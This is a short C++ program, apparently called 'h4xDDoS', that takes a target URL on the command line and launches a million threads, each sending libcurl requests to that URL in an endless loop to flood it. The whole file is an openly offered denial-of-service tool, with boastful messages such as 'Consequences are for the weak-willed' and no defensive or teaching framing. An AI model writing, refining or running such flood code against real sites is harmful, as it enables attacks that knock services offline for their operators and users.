#include <iostream>
#include <thread>
#include <chrono>
#include <vector>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>

void attack(const std::string& url) {
    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Curl initialization failed. Aborting..." << std::endl;
        std::exit(EXIT_FAILURE);
    }

    while (true) {
        CURLcode res;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        res = curl_easy_perform(curl);

        // Uncomment the line below if you want to print the response content
        // std::cout << curl_easy_strerror(res) << std::endl;

        // Uncomment the line below if you want to print the exception
        // std::cerr << curl_easy_strerror(res) << std::endl;
    }

    curl_easy_cleanup(curl);
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <Target URL>" << std::endl;
        std::exit(EXIT_FAILURE);
    }

    std::string url = argv[1];
    const int num_threads = 1000000;  // Set the number of threads

    std::cout << "Launching h4xDDoS attack on " << url << " with " << num_threads << " threads..." << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(attack, url);
    }

    // Sleep indefinitely (use Ctrl+C to stop the attack)
    while (true) {
        std::this_thread::sleep_for(std::chrono::hours(1));
    }

    std::cout << "Attack complete. Consequences are for the weak-willed." << std::endl;

    return 0;
}
